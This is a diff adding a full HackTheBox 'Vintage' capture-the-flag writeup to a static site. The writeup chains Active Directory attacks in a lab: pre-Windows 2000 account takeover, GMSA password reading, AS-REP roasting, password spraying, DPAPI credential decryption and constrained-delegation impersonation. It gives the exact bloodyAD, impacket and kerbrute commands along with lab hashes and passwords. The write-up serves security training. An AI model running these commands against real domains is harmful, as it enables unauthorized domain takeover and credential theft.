@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Vintage - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Vintage.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Vintage machine from HackTheBox - Hard difficulty level">
+    <meta name="description" content="Detailed writeup for Vintage machine from HackTheBox - Hard difficulty level">
     <meta name="keywords" content="HackTheBox, Vintage, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,198 @@
         <h1 class="writeup-title">Vintage</h1>
         <div class="writeup-metadata">
             <span class="difficulty hard">Hard</span>
-            <span class="date">Active machine</span>
+            <span class="date">April 26, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Vintage" src="../images/Vintage/pwned.png" /></p>
-<p>Vintage is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Vintage retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Vintage/pwned.png" /></p>
+<p>Vintage was a challenging Windows Active Directory box that demonstrated the importance of thorough enumeration and the exploitation of various AD weaknesses and permission relationships.
+Beginning with initial credentials for P.Rosa, I discovered NTLM authentication was disabled, requiring the use of Kerberos.
+After configuring my environment for Kerberos authentication, I used Bloodhound to map the domain structure and identify potential attack paths.</p>
+<p>The key vulnerabilities centered around a pre-Windows 2000 computer account (FS01), which used a predictable password scheme.
+By compromising this account, I gained access to read GMSA01's password, allowing me to add the GMSA account to the ServiceManagers group.
+This granted me control over service accounts, particularly svc_sql, which I was able to enable and crack its password.</p>
+<p>Password reuse turned out to be a critical weakness, as password spraying revealed C.Neri used the same credentials.
+After gaining access as C.Neri, I discovered DPAPI-encrypted data that contained C.Neri_adm's password.
+Using C.Neri_adm's GenericAll permissions over the delegated admins group, I added svc_sql to this group and set up constrained delegation.</p>
+<p>The final step involved setting an SPN on svc_sql and requesting a service ticket that allowed me to impersonate L.BIANCHI_adm, who had administrative privileges.
+Due to Windows Defender blocking traditional tools, I had to pivot to using wmiexec to finally gain administrative access to the domain controller.</p>
+<p>This box illustrated how complex AD permission relationships, predictable password schemes, and credential reuse can be chained together to achieve complete domain compromise, highlighting the importance of proper AD security configuration and monitoring.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Vintage/nmap.png" /></p>
+<p>Nmap scan reveals the domain name, as well as a few key services. This is an Active Directory box.</p>
+<h2>Getting a kerberos ticket as P.Rosa</h2>
+<p>I tried to enumerate the domain with the provided credentials, however, it seems like NTLM authentication is disabled.</p>
+<p><img alt="nosupport" src="../images/Vintage/nosupport.png" /></p>
+<p>I'll have to use a different method.
+Having these credentials will come in handy, as I will be requesting a kerberos ticket to utilize kerberos auth.</p>
+<p>In order to make that possible, I will have to modify my krb5.conf file.</p>
+<div class="codehilite"><pre><span></span><code><span class="k">[libdefaults]</span>
+<span class="w">    </span><span class="na">default_realm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">VINTAGE.HTB</span>
+
+<span class="k">[realms]</span>
+<span class="na">VINTAGE.HTB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">{</span>
+<span class="w">    </span><span class="na">kdc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">10.10.11.45</span>
+<span class="w">    </span><span class="na">admin_server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">10.10.11.45</span>
+<span class="na">}</span>
+
+<span class="c1"># Add these changes to the krb5.conf file</span>
+</code></pre></div>
+
+<p>Now I will be able to request a ticket for P.Rosa.</p>
+<p><img alt="krb" src="../images/Vintage/krb.png" /></p>
+<h2>Bloodhound enumeration</h2>
+<p>I will use bloodhound-python to gather data about the domain.</p>
+<p><img alt="fs" src="../images/Vintage/fs.png" /></p>
+<p>I've noticed that there are actually two computers in the domain, DC01 and FS01. I'll check both during enumeration.</p>
+<p><img alt="ianchi" src="../images/Vintage/ianchi.png" /></p>
+<p>L Bianchi is an administrator who can perform DCsync. Not very useful in this case as getting to L Bianchi will already let me root the box.</p>
+<p><img alt="fsinfo" src="../images/Vintage/fsinfo.png" /></p>
+<p>The FS workstation is a very old computer. This could be leveraged to take control of its machine account.</p>
+<p><img alt="gmsa" src="../images/Vintage/gmsa.png" /></p>
+<p>The computer accounts can read the GMSA password of GMSA01.</p>
+<p><img alt="gmsa01" src="../images/Vintage/gmsa1.png" /></p>
+<p>GMSA01 has GenericWrite over ServiceManagers, and can add itself to the group</p>
+<p><img alt="svc" src="../images/Vintage/svc.png" /></p>
+<p>The ServiceManagers group has GenericAll over the 3 SVC accounts, which will allow me to peform targeted kerberoast attacks against them.</p>
+<p><img alt="ceriadm" src="../images/Vintage/ceriadm.png" /></p>
+<p>C.Neri_ADM has GenericAll over the delegated admins group.</p>
+<p>If I can get to that account, I should be able to impersonate other users on the domain</p>
+<p>And that is all I've got from the bloodhound output. There is no clear way for domain takeover yet, but It might become visible as I go forward.</p>
+<h2>Taking over the pre-2000 windows workstation account</h2>
+<p>During my search about the outdated workstations, I  stumbled upon a post from the hacker recipes.</p>
+<p><code>https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers</code></p>
+<div class="codehilite"><pre><span></span><code>When a new computer account is configured as &quot;pre-Windows 2000 computer&quot;, its password is set based on its name (i.e. lowercase computer name without the trailing $). When it isn&#39;t, the password is randomly generated.
+</code></pre></div>
+
+<p><img alt="status" src="../images/Vintage/status.png" /></p>
+<p>This basically confirms the password for that computer account! I will be able to request a kerberos ticket to progress further.</p>
+<p><img alt="krbticket" src="../images/Vintage/krbticket.png" /></p>
+<h2>Reading the GMSA password of GMSA01</h2>
+<p>To read GMSA passwords, I'd usually use netexec with the ldap module.</p>
+<p><img alt="failure1" src="../images/Vintage/failure1.png" /></p>
+<p>However, it seems like that won't work in this situation. I will use bloodyAD instead.</p>
+<p><code>bloodyAD -k -d vintage.htb -u 'FS01' --host dc01.vintage.htb --dc-ip 10.10.11.45 get object GMSA01$ -attr msDS-ManagedPassword</code></p>
+<p><img alt="bloodyad" src="../images/Vintage/bloodyad.png" /></p>
+<h2>Attacking the SVC accounts</h2>
+<p>I won't be able to get a ticket the same way as before, as I don't have the password of GMSA01.
+I will use impacket-getTGT instead, because it does accept the raw hashes.</p>
+<p><code>impacket-getTGT -hashes 'aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178' -dc-ip 10.10.11.45 vintage.htb/GMSA01$</code></p>
+<p><img alt="ticket" src="../images/Vintage/ticket.png" /></p>
+<p>I'll keep using bloodyAD, this time to add the GMSA account to the service managers group.</p>
+<p><code>bloodyAD -d vintage.htb -u 'GMSA01$' --host 'dc01.vintage.htb' --dc-ip 10.10.11.45 -k add groupMember SERVICEMANAGERS GMSA01$</code></p>
+<p>I've tried the targeted kerberoast approach, but it just wouldn't work at all.
+There is one more way I can think of that could be succesful here.</p>
+<p>I'll leverage the NO-PREAUTH flag to set up the svc accounts for an attack with impacket's GetNPUsers.</p>
+<p><img alt="preauth" src="../images/Vintage/preauth.png" /></p>
+<p><code>impacket-GetNPUsers -request -outputfile out.txt -usersfile usersfile -no-pass -k -dc-ip 10.10.11.45 -dc-host dc01.vintage.htb vintage.htb/P.Rosa</code></p>
+<p>I've got the two hashes, but they would not crack with rockyou.txt. I must've overlooked something during my earlier bloodhound recon.</p>
+<p><img alt="false" src="../images/Vintage/false.png" /></p>
+<p>The svc_sql account is disabled. I should not have missed that, but oh well, a lesson for the future.</p>
+<p>I can enable the account just like I set the no preauth flags with bloodyAD earlier.</p>
+<p><code>bloodyAD -d vintage.htb -u 'P.Rosa' --host 'dc01.vintage.htb' --dc-ip 10.10.11.45 -k remove uac -f ACCOUNTDISABLE svc_sql</code></p>
+<p><img alt="hashes" src="../images/Vintage/hashes.png" /></p>
+<p>This time there are 3 hashes, svc_sql included. Since the hashes for ldap and ark accounts didn't crack earlier, I will try cracking only the sql account hash.</p>
+<p><img alt="cracked" src="../images/Vintage/cracked.png" /></p>
+<p><code>svc_sql | Zer0The0ne</code></p>
+<h2>Password spraying</h2>
+<p>There's not much I can do with this svc account right now. However, I did get a new password, which I will use in a password spray.</p>
+<p>First, I'll need a list of valid users.
+To do that, a simple ldapsearch query will suffice.
+Additionally, I will refine the output so that only the usernames will remain.</p>
+<p><code>ldapsearch -x -H ldap://10.10.11.45 -D "svc_sql@vintage.htb" -w "Zer0the0ne" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk -F ' ' '{ print $2 }' &gt; userlist.txt</code></p>
+<p><img alt="users" src="../images/Vintage/users.png" /></p>
+<p>My go-to way of password spraying is, once again, using netexec/crackmapexec with a file instead of the username.
+I can't use those here, but there is a different way to do the same thing.</p>
+<p><code>https://github.com/ropnop/kerbrute</code></p>
+<p>I will use the passwordspray command of kerbrute to check whether any of the users does have an identical password.</p>
+<p><img alt="kerbrute" src="../images/Vintage/kerbrute.png" /></p>
+<p>C.Neri has the same password. Since I don't have any more leads after this, I'll try to remote into the machine as them.</p>
+<p>First, I'll request a ticket with kinit. Then I'll use evil-winrm to gain a shell on the box</p>
+<p><img alt="user" src="../images/Vintage/user.png" /></p>
+<h1>Root flag</h1>
+<p>I tried to gain a meterpreter shell, because my evil-winrm session was super unstable. However:</p>
+<p><code>Program 'shell.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software</code></p>
+<p>Defender is running on the box, which means that many useful programs/scripts will be caught unless obfuscated.
+I could do that, but I could also do some manual checking first to see if there's an immediate point of interest within my reach.</p>
+<h2>Discovering the DPAPI-encrypted data</h2>
+<p>I started manually poking around user directories and microsoft folders, following my obsidian notes and going from one 'valuable' folder to another.</p>
+<p>Eventually, I found something that hinted that DPAPI was at play in this box.</p>
+<p><img alt="dpapi" src="../images/Vintage/dpapi.png" /></p>
+<p>DPAPI (Data Protection API) is used by Windows to securely encrypt and store data (often as encrypted blobs).
+It ties the encryption keys to the user's account, allowing only that user to decrypt the data.</p>
+<p><code>https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets</code></p>
+<p>This is a credential blob encrypted via DPAPI. I could tell because this is a location where DPAPI stores its encrypted data.</p>
+<p>Since I am logged in as C.Neri, I should also be able to grab their masterkey.</p>
+<h2>Decrypting the DPAPI blob</h2>
+<p>First, I'll download the encrypted blob. There is a single problem with that.</p>
+<p><img alt="fail" src="../images/Vintage/fail.png" /></p>
+<p>It seems like evil-winrm cannot download hidden files. This can be fixed by simply removing the hidden attribute from the blob.</p>
+<p>I will make a copy of the blob in C:\programdata.</p>
+<p><code>Copy-Item -Path C4BB96844A5C9DD45D5B6A9859252BA6 -Destination C:\programdata</code></p>
+<p>And I'll remove the attribute from the copy.</p>
+<p><code>attrib -H -S C:\ProgramData\C4BB96844A5C9DD45D5B6A9859252BA6</code></p>
+<p><img alt="download" src="../images/Vintage/download.png" /></p>
+<p>Now it can be downloaded without issues.</p>
+<p>Next, I need the masterkey of C.Neri to decrypt the blob. The directory for DPAPI masterkeys is:</p>
+<p><code>C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID</code></p>
+<p><img alt="whoami" src="../images/Vintage/whoami.png" /></p>
+<p>Running whoami /all shows the SID, so the only thing Im missing right now is the GUID.</p>
+<p><img alt="keys" src="../images/Vintage/keys.png" /></p>
+<p>However, knowing the GUID is not really all that necessary here. I can just grab both of the files and test each of them against the blob locally.</p>
+<p>Like before, I'll copy both of the files to C:\programdata, then I'll remove their hidden attribute to download them onto my box.</p>
+<p><img alt="downloads" src="../images/Vintage/downloads.png" /></p>
+<p>There are two ways of decrypting the blobs that I am familiar with. Locally with impacket-dpapi, or directly on the machine using mimikatz.</p>
+<p>I can't use mimikatz because of defender, so I'll have to use impacket here.</p>
+<div class="codehilite"><pre><span></span><code>impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
+impacket-dpapi masterkey -file 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
+</code></pre></div>
+
+<p><img alt="masterkeys" src="../images/Vintage/masterkeys.png" /></p>
+<p>Now I have two decrypted keys. I will try both of them against the blob, using impacket-dpapi for this as well.</p>
+<div class="codehilite"><pre><span></span><code>impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+</code></pre></div>
+
+<p>Using the incorrect key results in an <code>ERROR: Padding is incorrect.</code> error, and using the correct one reveals a password.</p>
+<p><img alt="decrypt" src="../images/Vintage/decrypt.png" /></p>
+<p>With a new password discovered, it is a good idea to try password spraying once again.</p>
+<p><img alt="password" src="../images/Vintage/password.png" /></p>
+<p><code>C.Neri_adm | Uncr4ck4bl3P4ssW0rd0312</code></p>
+<h2>Impersonating L_BIANCHI_ADM via delegation</h2>
+<p>I tried to remote into the machine as c.neri_adm, but doing that is not possible.</p>
+<p><img alt="fakesuccess" src="../images/Vintage/fakesuccess.png" /></p>
+<p>Still, I can leverage their privileges and rights over the delegated admins group.</p>
+<p>I can add my controlled users to the group thanks to the GenericAll permissions. C.Neri_adm cannot perform delegation at all.</p>
+<p><img alt="fail2" src="../images/Vintage/fail2.png" /></p>
+<p>It is most likely because they don't have an SPN set. To get past this, I need to controll an account fully so that I can modify its SPN value.</p>
+<p><img alt="cneri" src="../images/Vintage/cneri.png" /></p>
+<p>With C.Neri I have full control over the 3 service accounts. This will allow me to execute my plan and go forward with the delegation.</p>
+<p>First I'll request a TGT for C.Neri_adm via kinit.</p>
+<p><code>kinit C.Neri_adm</code></p>
+<p>Then I will add an svc account to the delegated admins group.</p>
+<p><code>bloodyAD -d vintage.htb -u C.Neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k --host dc01.vintage.htb --dc-ip 10.10.11.45 add groupMember delegatedadmins svc_sql</code></p>
+<p>I picked the sql account, because it is the only svc account with a known password.</p>
+<p>Now I need to switch to c.neri. I'll request a ticket for them like before.</p>
+<p><code>kinit C.Neri</code></p>
+<p>I'll add an SPN to the svc_sql account.</p>
+<p><code>bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" -u C.Neri -p Zer0the0ne --dc-ip 10.10.11.45 -k set object "SVC_SQL" servicePrincipalName  -v "cifs/sql"</code></p>
+<p>Then I will request a TGT for the svc_sql account.</p>
+<p><code>impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/svc_sql:Zer0the0ne</code></p>
+<p>If the command fails, it might be necessary to enable the account again via modifying the UAC flags..</p>
+<p><img alt="tgt" src="../images/Vintage/tgt.png" /></p>
+<p>Lastly, I'll request a service ticket for CIFS(Common Internet File System) on the DC as L.BIANCHI_adm.</p>
+<p><code>impacket-getST -spn cifs/dc01.vintage.htb -impersonate L.BIANCHI_adm  -k -dc-ip 10.10.11.45 vintage.htb/svc_sql:Zer0the0ne</code></p>
+<p><img alt="getst" src="../images/Vintage/getst.png" /></p>
+<p>This ticket with a very long name will allow me to get administrative access to the DC as L.BIANCHI_adm.</p>
+<p><code>export KRB5CCNAME=L.BIANCHI_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache</code></p>
+<p>However, evil-winrm will not work with it due to its name.
+Psexec will not work here either because it drops a file on the box, which will be detected by Defender.</p>
+<p>Luckily, there is also wmiexec which should work in this situation.</p>
+<p><code>impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb</code></p>
+<p><img alt="root" src="../images/Vintage/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
